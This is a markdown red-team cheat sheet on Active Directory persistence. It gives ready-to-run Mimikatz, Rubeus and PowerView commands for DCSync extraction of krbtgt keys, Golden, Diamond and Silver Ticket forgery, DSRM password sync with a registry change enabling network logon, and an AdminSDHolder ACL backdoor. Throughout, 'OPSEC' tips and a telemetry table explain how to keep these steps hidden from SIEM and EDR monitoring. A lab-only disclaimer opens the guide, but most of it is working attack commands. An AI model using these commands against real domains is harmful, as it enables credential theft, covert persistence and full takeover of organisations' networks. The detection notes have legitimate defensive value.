
# 🔒 Persistence & Domain Dominance (Advanced Red Team )

> **For lab environments, authorized penetration testing only.**
> 
> _Focus: EDR Evasion, OPSEC, Cryptographic Downgrade Avoidance, and Stealth._

---

## 1. Golden Ticket (TGT Forgery)

**Goal:** Forge a TGT using the compromised `krbtgt` account for persistent domain access.

> **⚠️ OPSEC Warning:** Never use RC4 (`/rc4`) or create tickets with a 10-year lifetime. Modern AD environments use AES-256. Forging an RC4 ticket or one that exceeds the default domain policy (usually 10 hours) will trigger immediate SIEM alerts.


```PowerShell
# Step 1: Extract the AES-256 key of the krbtgt account via DCSync
lsadump::dcsync /domain:domain.local /user:krbtgt

# Step 2: Get the Domain SID natively
Get-DomainSID

# Step 3: Forge and inject the Golden Ticket using AES-256 (Mimic normal ticket lifetime)
.\Rubeus.exe golden /aes256:KRBTGT_AES256_KEY /domain:domain.local `
    /sid:S-1-5-21-XXXXXXX /user:Administrator /id:500 /ptt
```

---

## 2. Diamond Ticket (TGT Modification)

**Goal:** Modify a legitimately issued TGT instead of forging one from scratch. This ensures the PAC (Privilege Attribute Certificate) is encrypted correctly and the ticket looks 100% authentic to Domain Controllers.

```PowerShell
# Request a legitimate TGT, decrypt it with the krbtgt AES key, modify the PAC to include Domain Admin groups, re-encrypt, and inject.
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator `
    /ticketuserid:500 /groups:512 /krbkey:KRBTGT_AES256_KEY /ptt
```

---

## 3. Silver Ticket (TGS Forgery)

**Goal:** Forge a Service Ticket (TGS) for a specific service. Bypasses the Domain Controller entirely—traffic flows directly between the attacker and the target machine.

```PowerShell
# Extract the target computer's AES-256 key (Requires Local Admin on the target or DCSync)
lsadump::dcsync /domain:domain.local /user:TargetMachine$

# Forge an AES-256 Silver Ticket for the CIFS (File Share / PSRemoting) service
.\Rubeus.exe silver /aes256:MACHINE_AES256_KEY /domain:domain.local `
    /sid:S-1-5-21-XXXXXXX /user:Administrator `
    /service:cifs/target.domain.local /ptt
```

---

## 4. DSRM Persistence (The Stealth Alternative)

**Goal:** Sync the Directory Services Restore Mode (DSRM) local administrator password with a domain account to maintain permanent remote access to the Domain Controller without forging tickets.

```PowerShell
# Step 1: Sync the DSRM password with the krbtgt account (Execute on the DC)
Invoke-Mimikatz -Command '"lsadump::setntlm /server:localhost /user:Administrator /sync:krbtgt"'

# Step 2: Modify the registry to allow DSRM logons over the network
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Step 3: Pass-the-Hash to access the DC remotely via WMI or PSRemoting
sekurlsa::pth /domain:TargetDC /user:Administrator /ntlm:KRBTGT_NTLM_HASH /run:cmd.exe
```

---

## 5. AdminSDHolder Abuse (SDProp)

**Goal:** Backdoor protected groups (e.g., Domain Admins, Enterprise Admins) with a persistent ACL entry. The `SDProp` process runs every 60 minutes and stamps the AdminSDHolder ACL onto all protected users.

> **OPSEC Tip:** Do not grant `GenericAll`. Instead, grant `GenericWrite` or `WriteDACL` to a hidden/low-privilege user to remain stealthy during AD audits.

```PowerShell
# Add persistent WriteDACL rights for a compromised low-privilege user
Add-DomainObjectAcl `
    -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" `
    -PrincipalIdentity backdoor_user -Rights WriteDacl
```

---

## 🛡️ OPSEC Notes & Telemetry Matrix

|**Technique**|**Requires**|**Detection Risk**|**Artifact Left / EDR Telemetry**|
|---|---|---|---|
|**Golden Ticket (RC4)**|krbtgt hash|**Critical**|Missing TGS-REQ (Event 4769). Ticket encryption `0x17` (RC4). Abnormal lifetimes.|
|**Golden Ticket (AES)**|krbtgt AES key|**Medium**|Missing TGS-REQ, but encryption blends in.|
|**Diamond Ticket**|krbtgt AES key|**Very Low**|Blends with legitimate Kerberos traffic. Highly evasive.|
|**Silver Ticket**|Service account hash|**Low**|No Domain Controller logs generated. Only detected locally on the target.|
|**DSRM Sync**|High Privs on DC|**Very Low**|Registry modification (`DsrmAdminLogonBehavior`). Normal NTLM/Kerberos auth after setup.|
|**AdminSDHolder**|Domain Admin|**Medium**|Event 5136 (Directory Service Changes). Easy to detect with BloodHound if audited.|

---

_Created for Active Directory Red Teaming Operations._
